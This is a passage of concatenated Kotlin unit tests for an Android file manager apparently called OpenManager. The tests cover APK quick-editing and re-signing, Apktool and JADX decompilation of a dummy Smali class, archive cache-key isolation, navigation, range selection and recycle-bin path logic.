```kt
package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class ApkQuickEditEngineTest {

    @Test
    fun testQuickEditOptionsDefaults() {
        val options = ApkQuickEditEngine.QuickEditOptions()
        assertTrue(options.autoSign)
        assertEquals(ApkSignerHelper.SignScheme.V1_AND_V2, options.signingScheme)
        assertEquals(null, options.appName)
        assertEquals(null, options.packageName)
        assertEquals(null, options.versionCode)
        assertEquals(null, options.versionName)
        assertEquals(null, options.minSdkVersion)
        assertEquals(null, options.targetSdkVersion)
        assertEquals(null, options.installLocation)
        assertEquals(null, options.newIconBytes)
        assertEquals(null, options.debuggable)
        assertEquals(null, options.extractNativeLibs)
    }

    @Test
    fun testPackageNameValidation() {
        val validPackages = listOf(
            "com.example.app",
            "me.zhanghai.android.files",
            "org.test_123.app_v2",
            "a.b.c",
            "com.modder.hub"
        )
        val invalidPackages = listOf(
            "123.com",
            "com..example",
            "com.app-invalid",
            "",
            "app",
            "com.example.",
            ".com.example"
        )

        val regex = Regex("^[a-zA-Z][a-zA-Z0-9_]*(\\.[a-zA-Z][a-zA-Z0-9_]*)+$")

        for (pkg in validPackages) {
            assertTrue("Expected valid package: $pkg", pkg.matches(regex))
        }
        for (pkg in invalidPackages) {
            assertFalse("Expected invalid package: $pkg", pkg.matches(regex))
        }
    }

    @Test
    fun testInstallLocationConstants() {
        assertEquals(0x010102b7, ApkQuickEditEngine.ATTR_INSTALL_LOCATION)
        val autoLoc = 0
        val internalLoc = 1
        val externalLoc = 2
        val defaultLoc = -1

        assertTrue(autoLoc in 0..2)
        assertTrue(internalLoc in 0..2)
        assertTrue(externalLoc in 0..2)
        assertFalse(defaultLoc in 0..2)
    }

    @Test
    fun testQuickEditOnRealApkIfAvailable() {
        val sampleApk = File("build_apk/OpenManager-debug.apk/app-debug.apk")
        if (!sampleApk.exists()) {
            return
        }

        // Test loading original APK info
        val info = ApkQuickEditEngine.loadQuickEditInfo(sampleApk)
        assertNotNull(info)
        assertEquals("me.zhanghai.android.files", info.packageName)
        assertEquals(40, info.versionCode)
        assertEquals("1.7.5", info.versionName)
        assertEquals(23, info.minSdkVersion)
        assertEquals(36, info.targetSdkVersion)

        // Test modifying APK
        val tempDir = File(System.getProperty("java.io.tmpdir"), "quickedit_test_" + System.currentTimeMillis())
        tempDir.mkdirs()
        val outApk = File(tempDir, "edited_test.apk")

        try {
            val options = ApkQuickEditEngine.QuickEditOptions(
                appName = "Test App Renamed",
                packageName = "com.test.quickedit.unit",
                versionCode = 999,
                versionName = "9.9.9-test",
                minSdkVersion = 24,
                targetSdkVersion = 34,
                installLocation = 2,
                debuggable = true,
                extractNativeLibs = true,
                autoSign = false // Test unsigned first for speed
            )

            val resultFile = ApkQuickEditEngine.applyQuickEdit(sampleApk, outApk, options)
            assertTrue(resultFile.exists())
            assertTrue(resultFile.length() > 0)

            // Verify modified attributes by reloading
            val editedInfo = ApkQuickEditEngine.loadQuickEditInfo(resultFile)
            assertEquals("com.test.quickedit.unit", editedInfo.packageName)
            assertEquals(999, editedInfo.versionCode)
            assertEquals("9.9.9-test", editedInfo.versionName)
            assertEquals(24, editedInfo.minSdkVersion)
            assertEquals(34, editedInfo.targetSdkVersion)
            assertEquals(2, editedInfo.installLocation)
            assertTrue(editedInfo.isDebuggable)
        } finally {
            outApk.delete()
            tempDir.delete()
        }
    }
}
```

```kt
        ApktoolCli.main(arrayOf("--version"))
        ApktoolCli.main(arrayOf("-h"))
        ApktoolCli.main(arrayOf("--help"))
    }

    @Test
    fun testApktoolEngineDecompileAndRecompile() {
        val tempDir = File.createTempFile("apktool_test_", "").apply {
            delete()
            mkdirs()
        }

        try {
            // 1. Create a dummy DEX file from Smali
            val smaliFile = File(tempDir, "TestClass.smali")
            smaliFile.writeText("""
                .class public Lcom/example/demo/TestClass;
                .super Ljava/lang/Object;

                .method public constructor <init>()V
                    .registers 1
                    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
                    return-void
                .end method

                .method public static getValue()I
                    .registers 1
                    const/16 v0, 42
                    return v0
                .end method
            """.trimIndent())

            val dexFile = File(tempDir, "classes.dex")
            val smaliOpts = SmaliOptions().apply {
                apiLevel = 28
                outputDexFile = dexFile.absolutePath
            }
            assertTrue("Smali assemble should succeed", Smali.assemble(smaliOpts, listOf(smaliFile.absolutePath)))

            // 2. Package into a test APK
            val testApk = File(tempDir, "test_input.apk")
            FileOutputStream(testApk).use { fos ->
                ZipOutputStream(fos).use { zos ->
                    // Add AndroidManifest.xml
                    zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
                    zos.write("<manifest package=\"com.example.demo\"/>".toByteArray(StandardCharsets.UTF_8))
                    zos.closeEntry()

                    // Add classes.dex
                    zos.putNextEntry(ZipEntry("classes.dex"))
                    zos.write(dexFile.readBytes())
                    zos.closeEntry()

                    // Add a sample asset
                    zos.putNextEntry(ZipEntry("assets/sample.txt"))
                    zos.write("Hello Apktool".toByteArray(StandardCharsets.UTF_8))
                    zos.closeEntry()
                }
            }

            assertTrue("Test APK must exist", testApk.exists() && testApk.length() > 0)

            // 3. Decompile using ApktoolEngine
            val outDir = File(tempDir, "decompiled_project")
            var logMessageCount = 0
            val listener = object : ApktoolEngine.ApktoolListener {
                override fun onProgress(message: String, detail: String, percentage: Int) {}
                override fun onLog(message: String) {
                    logMessageCount++
                }
            }

            ApktoolEngine.decompileApk(
                inputApk = testApk,
                outputDir = outDir,
                options = ApktoolEngine.DecompileOptions(forceOverwrite = true),
                listener = listener
            )

            assertTrue("Decompiled directory must exist", outDir.exists())
            assertTrue("apktool.yml must exist", File(outDir, "apktool.yml").exists())
            assertTrue("AndroidManifest.xml must exist", File(outDir, "AndroidManifest.xml").exists())
            assertTrue("assets/sample.txt must exist", File(outDir, "assets/sample.txt").exists())

            val smaliOutputDir = File(outDir, "smali")
            assertTrue("smali directory must exist", smaliOutputDir.exists())
            val decompiledSmali = File(smaliOutputDir, "com/example/demo/TestClass.smali")
            assertTrue("Decompiled smali file must exist", decompiledSmali.exists())
            assertTrue("Smali content must contain TestClass", decompiledSmali.readText().contains("TestClass"))

            // 4. Recompile project using ApktoolEngine
            val rebuiltApk = File(tempDir, "rebuilt_output.apk")
            ApktoolEngine.recompileApk(
                projectDir = outDir,
                outputApk = rebuiltApk,
                options = ApktoolEngine.RecompileOptions(forceOverwrite = true),
                listener = listener
            )

            assertTrue("Rebuilt APK must exist", rebuiltApk.exists())
            assertTrue("Rebuilt APK must have positive size", rebuiltApk.length() > 0)
        } finally {
            tempDir.deleteRecursively()
        }
    }
}
```

`app/src/test/java/me/zhanghai/android/files/filelist/ApktoolPathAndCancellationTest.kt`:

```kt
/*

package me.zhanghai.android.files.filelist

import com.android.tools.smali.smali.Smali
import com.android.tools.smali.smali.SmaliOptions
import me.zhanghai.android.files.viewer.dex.JadxDecompilerEngine
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

class ApktoolPathAndCancellationTest {

    @Test
    fun testApktoolPathHierarchy() {
        val testPkg = "com.test.company"

        val baseDir = ApktoolPaths.getApktoolBaseDir()
        assertTrue("Base dir must contain ApkTool", baseDir.path.contains("ApkTool"))

        val pkgDir = ApktoolPaths.getPackageDir(testPkg)
        assertTrue("Package dir must contain packageName", pkgDir.path.contains(testPkg))

        val javaDecompDir = ApktoolPaths.getJavaDecompileDir(testPkg)
        val expectedJavaSuffix = File(testPkg, "decomp_java").path
        assertTrue(
            "Java decompile path must end with $expectedJavaSuffix, got: ${javaDecompDir.path}",
            javaDecompDir.path.endsWith(expectedJavaSuffix)
        )

        val srcDecompDir = ApktoolPaths.getApktoolDecompileDir(testPkg)
        val expectedSrcSuffix = File(testPkg, "decomp_src").path
        assertTrue(
            "Apktool src decompile path must end with $expectedSrcSuffix, got: ${srcDecompDir.path}",
            srcDecompDir.path.endsWith(expectedSrcSuffix)
        )

        val recompiledApk = ApktoolPaths.getRecompiledApkFile(testPkg)
        val expectedApkName = "${testPkg}_recompiled.apk"
        assertEquals("Recompiled APK name must match", expectedApkName, recompiledApk.name)
    }

    @Test
    fun testDecompileToDirectoryWithCancellation() {
        val tempDir = File.createTempFile("apktool_cancel_test", "").apply {
            delete()
            mkdirs()
        }

        try {
            val smaliFile = File(tempDir, "Sample.smali")
            val dexFile = File(tempDir, "classes.dex")

            val smaliCode = """
                .class public Lcom/test/company/Sample;
                .super Ljava/lang/Object;

                .method public constructor <init>()V
                    .registers 1
                    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
                    return-void
                .end method

                .method public hello()Ljava/lang/String;
                    .registers 2
                    const-string v0, "Hello World"
                    return-object v0
                .end method
            """.trimIndent()
            smaliFile.writeText(smaliCode)

            val options = SmaliOptions().apply {
                apiLevel = 28
                outputDexFile = dexFile.absolutePath
            }
            assertTrue("Smali assemble must succeed", Smali.assemble(options, listOf(smaliFile.absolutePath)))

            val outDir = File(tempDir, "decomp_java")

            // Test successful directory extraction
            var progressNotified = false
            JadxDecompilerEngine.decompileToDirectory(dexFile, outDir, isCancelled = { false }) { cur, total, cls ->
                progressNotified = true
                assertTrue(cur > 0)
                assertTrue(total > 0)
                assertTrue(cls.contains("Sample"))
            }

            assertTrue("Progress callback should have been invoked", progressNotified)
            val extractedJava = File(outDir, "com/test/company/Sample.java")
            assertTrue("Extracted .java file must exist", extractedJava.exists())
            val sourceText = extractedJava.readText()
            assertTrue("Java source must contain class Sample", sourceText.contains("class Sample"))
            assertTrue("Java source must contain hello method", sourceText.contains("hello()"))

            // Test cancellation aborts immediately
            val cancelSignal = AtomicBoolean(true)
            var threwCancellation = false
            val cancelledDir = File(tempDir, "cancelled_run")
            try {
                JadxDecompilerEngine.decompileToDirectory(dexFile, cancelledDir, isCancelled = { cancelSignal.get() })
            } catch (ie: InterruptedException) {
                threwCancellation = true
            }

            assertTrue("Must throw InterruptedException when cancelled", threwCancellation)
        } finally {
            tempDir.deleteRecursively()
        }
    }

    @Test
    fun testApktoolTaskStateTransitions() {
        val initial = ApktoolExecutionService.TaskState(
            taskType = ApktoolExecutionService.TASK_TYPE_DECOMPILE_JAVA,
            title = "Descompilar a Java (JADX)",
            packageName = "com.test.company",
            inputPath = "/test/app.apk",
            outputPath = "/test/decomp_java",
            status = "Iniciando...",
            detail = "",
            progress = 0,
            isIndeterminate = true,
            isRunning = true,
            isCancelled = false,
            isCompleted = false
        )

        assertTrue(initial.isRunning)
        assertFalse(initial.isCompleted)
        assertFalse(initial.isCancelled)

        // Progress update
        val inProgress = initial.copy(
            status = "Descompilando clases Java (45%)",
            detail = "45/100: MainActivity.java",
            progress = 45,
            isIndeterminate = false
        )
        assertEquals(45, inProgress.progress)
        assertFalse(inProgress.isIndeterminate)

        // Cancelled transition
        val cancelled = inProgress.copy(
            isRunning = false,
            isCancelled = true,
            status = "Operación cancelada"
        )
        assertFalse(cancelled.isRunning)
        assertTrue(cancelled.isCancelled)

        // Completed transition
        val completed = inProgress.copy(
            isRunning = false,
            isCompleted = true,
            progress = 100,
            status = "Operación completada exitosamente"
        )
        assertFalse(completed.isRunning)
        assertTrue(completed.isCompleted)
        assertEquals(100, completed.progress)
    }
}
```

`app/src/test/java/me/zhanghai/android/files/filelist/ArchiveAndDirectoryResolverTest.kt`:

```kt
/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.net.URI

class ArchiveAndDirectoryResolverTest {

    private fun getCacheKey(uri: String?, pathString: String): String =
        try {
            if (uri != null) URI.create(uri).toString() else pathString
        } catch (_: Throwable) {
            pathString
        }

    @Test
    fun testCacheKeyIsolationBetweenLinuxRootAndArchiveRoots() {
        val linuxRootUri = "file:///"
        val linuxRootPath = "/"

        val romArchiveUri = "archive:////storage/1234-5678/lineage-21.0-rom.zip?/"
        val romArchivePath = "/"

        val apkArchiveUri = "archive:////storage/emulated/0/Al%20Dolar.apk?/"
        val apkArchivePath = "/"

        val linuxKey = getCacheKey(linuxRootUri, linuxRootPath)
        val romKey = getCacheKey(romArchiveUri, romArchivePath)
        val apkKey = getCacheKey(apkArchiveUri, apkArchivePath)

        // While internal relative path is "/" for all 3, their cache keys MUST be completely distinct!
        assertNotEquals(linuxKey, romKey)
        assertNotEquals(linuxKey, apkKey)
        assertNotEquals(romKey, apkKey)

        assertEquals("file:///", linuxKey)
        assertEquals("archive:////storage/1234-5678/lineage-21.0-rom.zip?/", romKey)
        assertEquals("archive:////storage/emulated/0/Al%20Dolar.apk?/", apkKey)
    }

    @Test
    fun testCacheLookupSimulationPreventsRootFolderLeak() {
        // Simulated snapshot cache
        val cache = mutableMapOf<String, List<String>>()

        val linuxKey = "file:///"
        val rootFolders = listOf("acct", "apex", "bin", "data", "dev", "etc", "metadata", "mnt", "system")
        cache[linuxKey] = rootFolders

        val romKey = "archive:////storage/1234-5678/lineage-rom.zip?/"
        val apkKey = "archive:////storage/emulated/0/Al%20Dolar.apk?/"

        // Visiting archive roots must NOT return the cached Linux root folders!
        assertNull(cache[romKey])
        assertNull(cache[apkKey])
        assertEquals(rootFolders, cache[linuxKey])

        // When archive contents are loaded, they are stored under their own key
        val romEntries = listOf("boot.img", "system.new.dat.br", "META-INF")
        cache[romKey] = romEntries

        assertEquals(romEntries, cache[romKey])
        assertEquals(rootFolders, cache[linuxKey])
        assertNull(cache[apkKey])
    }

    @Test
    fun testUnprivilegedResolverRulesForArchives() {
        // Rule: Archive paths and non-Linux paths must NEVER receive static virtual Linux root folders!
        fun shouldResolveUnprivilegedStaticMap(isArchivePath: Boolean, isLinuxPath: Boolean): Boolean {
            if (isArchivePath || !isLinuxPath) return false
            return true
        }

        assertFalse("Archive path must never query static Linux root", shouldResolveUnprivilegedStaticMap(isArchivePath = true, isLinuxPath = false))
        assertFalse("Archive path even if masquerading as LinuxPath must never query static root", shouldResolveUnprivilegedStaticMap(isArchivePath = true, isLinuxPath = true))
        assertFalse("DocumentPath / SAF must never query static Linux root", shouldResolveUnprivilegedStaticMap(isArchivePath = false, isLinuxPath = false))
        assertTrue("Local unprivileged Linux path CAN query static root", shouldResolveUnprivilegedStaticMap(isArchivePath = false, isLinuxPath = true))
    }

    @Test
    fun testArchiveFailureHandlingNeverInjectsVirtualRoot() {
        // Simulation of FileListLiveData fallback logic
        fun determineResultState(
            isArchivePath: Boolean,
            isLinuxPath: Boolean,
            loadException: Exception?
        ): String {
            if (loadException != null) {
                if (isArchivePath) {
                    return "Failure(${loadException.message})"
                }
                if (isLinuxPath) {
                    return "VirtualLinuxRoot"
                }
                return "Failure(${loadException.message})"
            }
            return "Success"
        }

        val zipException = java.io.IOException("Corrupted central directory or OTA signature")
        val archiveResult = determineResultState(isArchivePath = true, isLinuxPath = false, loadException = zipException)
        assertEquals("Failure(Corrupted central directory or OTA signature)", archiveResult)

        val unprivilegedLinuxResult = determineResultState(isArchivePath = false, isLinuxPath = true, loadException = java.lang.SecurityException("Permission denied"))
        assertEquals("VirtualLinuxRoot", unprivilegedLinuxResult)
    }

    @Test
    fun testAndroidDataObbProtectionExcludesArchives() {
        fun isAndroidData(pathStr: String, isArchive: Boolean): Boolean {
            if (isArchive) return false
            return pathStr.contains("/Android/data", ignoreCase = true)
        }

        fun isAndroidObb(pathStr: String, isArchive: Boolean): Boolean {
            if (isArchive) return false
            return pathStr.contains("/Android/obb", ignoreCase = true)
        }

        // Inside a ROM or backup zip, there could be files matching Android/data, but they must NOT trigger SAF prompts!
        assertTrue(isAndroidData("/storage/emulated/0/Android/data", isArchive = false))
        assertFalse(isAndroidData("/Android/data", isArchive = true))
        assertFalse(isAndroidData("/system/app/Android/data", isArchive = true))

        assertTrue(isAndroidObb("/storage/emulated/0/Android/obb", isArchive = false))
        assertFalse(isAndroidObb("/Android/obb", isArchive = true))
    }

    @Test
    fun testZipResilientFallbackExtractsEntries() {
        val bos = java.io.ByteArrayOutputStream()
        java.util.zip.ZipOutputStream(bos).use { zos ->
            zos.putNextEntry(java.util.zip.ZipEntry("a.sh"))
            zos.write("#!/bin/sh\necho test\n".toByteArray())
            zos.closeEntry()
            zos.putNextEntry(java.util.zip.ZipEntry("scripts/"))
            zos.closeEntry()
            zos.putNextEntry(java.util.zip.ZipEntry("scripts/sub.sh"))
            zos.write("echo sub\n".toByteArray())
            zos.closeEntry()
        }
        val zipBytes = bos.toByteArray()
        assertTrue(zipBytes.size > 0)

        val entryNames = mutableListOf<String>()
        java.util.zip.ZipInputStream(java.io.ByteArrayInputStream(zipBytes)).use { zis ->
            while (true) {
                val entry = zis.nextEntry ?: break
                entryNames += entry.name
                zis.closeEntry()
            }
        }
        assertEquals(listOf("a.sh", "scripts/", "scripts/sub.sh"), entryNames)
    }
}
```

`app/src/test/java/me/zhanghai/android/files/filelist/CreateItemLogicTest.kt`:

```kt
/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class CreateItemLogicTest {

    private fun applyExtension(currentText: String, ext: String): Pair<String, Int> {
        return if (currentText.isEmpty()) {
            val defaultName = "nuevo$ext"
            Pair(defaultName, "nuevo".length)
        } else {
            val dot = currentText.lastIndexOf('.')
            val base = if (dot > 0) currentText.substring(0, dot) else currentText
            val newText = base + ext
            Pair(newText, base.length)
        }
    }

    @Test
    fun testApplyExtensionToEmptyText() {
        val (text, selectionEnd) = applyExtension("", ".txt")
        assertEquals("nuevo.txt", text)
        assertEquals(5, selectionEnd)
    }

    @Test
    fun testApplyExtensionToNameWithoutExtension() {
        val (text, selectionEnd) = applyExtension("my_script", ".sh")
        assertEquals("my_script.sh", text)
        assertEquals(9, selectionEnd)
    }

    @Test
    fun testReplaceExistingExtension() {
        val (text, selectionEnd) = applyExtension("manifest.xml", ".json")
        assertEquals("manifest.json", text)
        assertEquals(8, selectionEnd)
    }

    @Test
    fun testNameValidation() {
        val validFolderName = "New_Folder_123"
        val invalidFolderName1 = "folder/subfolder"
        val invalidFolderName2 = "folder\u0000"

        assertTrue(isValidFileName(validFolderName))
        assertFalse(isValidFileName(invalidFolderName1))
        assertFalse(isValidFileName(invalidFolderName2))
    }

    private fun isValidFileName(name: String): Boolean {
        if (name.isEmpty()) return false
        if (name.contains('/') || name.contains('\\') || name.contains('\u0000')) return false
        return true
    }
}
```

```kt
/*

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Test

class DirectionalActionLogicTest {

    private fun getDirectionalCopyLabel(isPanelA: Boolean, isArchive: Boolean): String {
        val verb = if (isArchive) "Extraer" else "Copiar"
        return if (isPanelA) "$verb >>" else "<< $verb"
    }

    private fun getDirectionalMoveLabel(isPanelA: Boolean): String {
        return if (isPanelA) "Mover >>" else "<< Mover"
    }

    private fun getSelectAllText(selectedCount: Int, totalSelectable: Int): String {
        return if (selectedCount > 0 && selectedCount >= totalSelectable && totalSelectable > 0) {
            "Desmarcar"
        } else if (selectedCount > 0) {
            "Todo ($selectedCount)"
        } else {
            "Todo"
        }
    }

    @Test
    fun testLeftPanelDirectionalLabels() {
        // Panel A (Left) sends files to Panel B (Right) -> arrows point right (>>)
        assertEquals("Copiar >>", getDirectionalCopyLabel(isPanelA = true, isArchive = false))
        assertEquals("Extraer >>", getDirectionalCopyLabel(isPanelA = true, isArchive = true))
        assertEquals("Mover >>", getDirectionalMoveLabel(isPanelA = true))
    }

    @Test
    fun testRightPanelDirectionalLabels() {
        // Panel B (Right) sends files to Panel A (Left) -> arrows point left (<<)
        assertEquals("<< Copiar", getDirectionalCopyLabel(isPanelA = false, isArchive = false))
        assertEquals("<< Extraer", getDirectionalCopyLabel(isPanelA = false, isArchive = true))
        assertEquals("<< Mover", getDirectionalMoveLabel(isPanelA = false))
    }

    @Test
    fun testSelectAllButtonText() {
        // When some files selected
        assertEquals("Todo (3)", getSelectAllText(selectedCount = 3, totalSelectable = 10))

        // When all files selected
        assertEquals("Desmarcar", getSelectAllText(selectedCount = 10, totalSelectable = 10))

        // When no files selected
        assertEquals("Todo", getSelectAllText(selectedCount = 0, totalSelectable = 10))
    }
}
```

`app/src/test/java/me/zhanghai/android/files/filelist/NavigationLogicTest.kt`:

```kt
/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class NavigationLogicTest {

    private fun isHomeOrRootPath(pathStr: String, isArchive: Boolean = false): Boolean {
        if (isArchive) return false
        val s = pathStr.trimEnd('/')
        return s.isEmpty() || s == "/"
    }

    private fun canNavigateUp(pathStr: String, hasArchiveParent: Boolean = false, isArchive: Boolean = false): Boolean {
        if (isHomeOrRootPath(pathStr, isArchive)) {
            return false
        }
        return true || hasArchiveParent
    }

    private fun shouldExitOnBackPress(lastBackPressTime: Long, currentTime: Long): Boolean {
        return (currentTime - lastBackPressTime) < 2000L
    }

    @Test
    fun testHomePathsIdentifiedCorrectly() {
        assertFalse(isHomeOrRootPath("/storage/emulated/0"))
        assertFalse(isHomeOrRootPath("/storage/emulated/0/"))
        assertFalse(isHomeOrRootPath("/sdcard"))
        assertFalse(isHomeOrRootPath("/sdcard/"))
        assertTrue(isHomeOrRootPath("/"))
        assertTrue(isHomeOrRootPath(""))
    }

    @Test
    fun testSubdirectoryPathsCanNavigateUp() {
        assertFalse(isHomeOrRootPath("/storage/emulated/0/Download"))
        assertFalse(isHomeOrRootPath("/storage/emulated/0/Android/data"))
        assertFalse(isHomeOrRootPath("/data/local/tmp"))

        assertTrue(canNavigateUp("/storage/emulated/0/Download"))
        assertTrue(canNavigateUp("/storage/emulated/0/Android/data"))
    }

    @Test
    fun testHomePathCanNavigateUpToStorageAndRoot() {
        assertTrue(canNavigateUp("/storage/emulated/0"))
        assertTrue(canNavigateUp("/storage/emulated/0/"))
        assertFalse(canNavigateUp("/"))
    }

    @Test
    fun testDoubleBackPressExitWindow() {
        val firstPress = 10000L
        val quickSecondPress = 11500L // 1.5s later -> exit
        val slowSecondPress = 12500L // 2.5s later -> do not exit

        assertTrue(shouldExitOnBackPress(firstPress, quickSecondPress))
        assertFalse(shouldExitOnBackPress(firstPress, slowSecondPress))
    }

    @Test
    fun testDefaultJumpPathTargets() {
        val internalPath = "/storage/emulated/0/"
        val downloadsPath = "/storage/emulated/0/Download/"
        val androidDataPath = "/storage/emulated/0/Android/data/"
        val rootPath = "/"

        assertTrue(internalPath.startsWith("/storage/emulated/0"))
        assertTrue(downloadsPath.startsWith(internalPath))
        assertTrue(androidDataPath.startsWith(internalPath))
        assertEquals("/", rootPath)
    }

    enum class ToolbarNavIcon {
        CLEAR_SELECTION,
        OPEN_DRAWER
    }

    private fun resolveToolbarNavIcon(selectedCount: Int): ToolbarNavIcon {
        return if (selectedCount > 0) ToolbarNavIcon.CLEAR_SELECTION else ToolbarNavIcon.OPEN_DRAWER
    }

    private fun isToolbarBackButtonVisible(selectedCount: Int, canNavigateUp: Boolean): Boolean {
        return selectedCount == 0 && canNavigateUp
    }

    @Test
    fun testToolbarNavigationModeResolution() {
        // When items are selected, navigation icon clears selection and back button is hidden
        assertEquals(ToolbarNavIcon.CLEAR_SELECTION, resolveToolbarNavIcon(selectedCount = 1))
        assertEquals(ToolbarNavIcon.CLEAR_SELECTION, resolveToolbarNavIcon(selectedCount = 5))
        assertFalse(isToolbarBackButtonVisible(selectedCount = 1, canNavigateUp = true))
        assertFalse(isToolbarBackButtonVisible(selectedCount = 5, canNavigateUp = false))

        // When no items are selected, navigation icon ALWAYS opens drawer (hamburger menu)
        assertEquals(ToolbarNavIcon.OPEN_DRAWER, resolveToolbarNavIcon(selectedCount = 0))

        // Dedicated toolbar back button appears whenever canNavigateUp is true
        assertTrue(isToolbarBackButtonVisible(selectedCount = 0, canNavigateUp = true))
        assertFalse(isToolbarBackButtonVisible(selectedCount = 0, canNavigateUp = false))
    }

    @Test
    fun testArchivePathCanAlwaysNavigateUpAndShowsBackButton() {
        // When inside an APK/archive root, path is "/" internally, but isArchive is true
        assertFalse(isHomeOrRootPath("/", isArchive = true))
        val canNavUpArchiveRoot = canNavigateUp("/", hasArchiveParent = true, isArchive = true)
        assertTrue(canNavUpArchiveRoot)

        // Toolbar dedicated back button MUST be visible when viewing an APK
        assertTrue(isToolbarBackButtonVisible(selectedCount = 0, canNavigateUp = canNavUpArchiveRoot))

        // When inside an APK subfolder (e.g. /res/layout), it can also navigate up
        assertFalse(isHomeOrRootPath("/res/layout", isArchive = true))
        assertTrue(canNavigateUp("/res/layout", hasArchiveParent = false, isArchive = true))
    }

    @Test
    fun testFileMenuCopyFormats() {
        val singleFilePath = "/storage/emulated/0/Download/test.exe"
        val singleFileName = "test.exe"

        // Single file touch header -> full path
        assertEquals("/storage/emulated/0/Download/test.exe", singleFilePath)
        // Single file long touch header -> file name
        assertEquals("test.exe", singleFileName)

        // Multiple files touch header -> newline-separated paths
        val multiFiles = listOf(
            "/storage/emulated/0/Download/app.apk",
            "/storage/emulated/0/Download/readme.txt"
        )
        val joinedPaths = multiFiles.joinToString("\n")
        assertEquals("/storage/emulated/0/Download/app.apk\n/storage/emulated/0/Download/readme.txt", joinedPaths)
    }
}
```

`app/src/test/java/me/zhanghai/android/files/filelist/RangeSelectionLogicTest.kt`:

```kt
/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class RangeSelectionLogicTest {

    data class MockFile(val name: String, val isParent: Boolean = false, val selectable: Boolean = true)

    private fun computeRangeSelection(
        items: List<MockFile>,
        anchor: Int,
        target: Int
    ): List<Int> {
        val start = minOf(anchor, target).coerceAtLeast(0)
        val end = maxOf(anchor, target).coerceAtMost(items.size - 1)
        val selectedIndices = mutableListOf<Int>()
        for (i in start..end) {
            val item = items[i]
            if (!item.isParent && item.selectable) {
                selectedIndices.add(i)
            }
        }
        return selectedIndices
    }

    private fun toggleSelectAll(
        totalSelectable: Int,
        currentSelectedCount: Int
    ): Boolean {
        // Returns true if new state should be "select all", false if "clear selection"
        return !(currentSelectedCount >= totalSelectable && totalSelectable > 0)
    }

    @Test
    fun testRangeSelectionDownwards() {
        // Files: [.., file1, file2, file3, file4, file5]
        val items = listOf(
            MockFile("..", isParent = true),
            MockFile("file1.txt"),
            MockFile("file2.txt"),
            MockFile("file3.txt"),
            MockFile("file4.txt"),
            MockFile("file5.txt")
        )
        // User selected file1 (index 1), then swiped file4 (index 4) downwards
        val selected = computeRangeSelection(items, 1, 4)
        assertEquals(listOf(1, 2, 3, 4), selected)
        assertEquals(4, selected.size)
    }

    @Test
    fun testRangeSelectionUpwards() {
        val items = listOf(
            MockFile("..", isParent = true),
            MockFile("file1.txt"),
            MockFile("file2.txt"),
            MockFile("file3.txt"),
            MockFile("file4.txt"),
            MockFile("file5.txt")
        )
        // User selected file5 (index 5), then swiped file2 (index 2) upwards
        val selected = computeRangeSelection(items, 5, 2)
        assertEquals(listOf(2, 3, 4, 5), selected)
        assertEquals(4, selected.size)
    }

    @Test
    fun testParentDirectoryIsNeverSelected() {
        val items = listOf(
            MockFile("..", isParent = true),
            MockFile("file1.txt"),
            MockFile("file2.txt")
        )
        // Swiping across parent directory index 0
        val selected = computeRangeSelection(items, 0, 2)
        assertFalse(selected.contains(0))
        assertEquals(listOf(1, 2), selected)
    }

    @Test
    fun testToggleSelectAllLogic() {
        val totalSelectable = 10
        // When 0 selected: clicking Todo selects all
        assertTrue(toggleSelectAll(totalSelectable, 0))
        // When 5 selected: clicking Todo selects all
        assertTrue(toggleSelectAll(totalSelectable, 5))
        // When all 10 selected: clicking Todo deselects all
        assertFalse(toggleSelectAll(totalSelectable, 10))
    }

    @Test
    fun testSingleItemSwipeToggle() {
        val selectedSet = mutableSetOf<String>()
        val item = "test.apk"

        // First swipe selects
        if (selectedSet.isEmpty()) {
            selectedSet.add(item)
        }
        assertTrue(selectedSet.contains(item))

        // Second swipe on lone item deselects
        if (selectedSet.contains(item) && selectedSet.size == 1) {
            selectedSet.remove(item)
        }
        assertTrue(selectedSet.isEmpty())
    }
}
```

`app/src/test/java/me/zhanghai/android/files/filelist/RecycleBinLogicTest.kt`:

```kt
/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class RecycleBinLogicTest {

    private val recycleBinBasePath = "/storage/emulated/0/OpenManager/.recycle"

    private fun isPathInsideRecycleBin(pathStr: String, baseRecycleStr: String = recycleBinBasePath): Boolean {
        val cleanRecycle = baseRecycleStr.trimEnd('/')
        val cleanPath = pathStr.trimEnd('/')
        return cleanPath == cleanRecycle || cleanPath.startsWith("$cleanRecycle/")
    }

    private fun formatRecycleDisplayPath(pathStr: String, baseRecycleStr: String = recycleBinBasePath, localizedBinName: String = "Recycle Bin"): String {
        val cleanRecycle = baseRecycleStr.trimEnd('/')
        val cleanPath = pathStr.trimEnd('/')
        return when {
            cleanPath == cleanRecycle -> "$localizedBinName/"
            cleanPath.startsWith("$cleanRecycle/") -> {
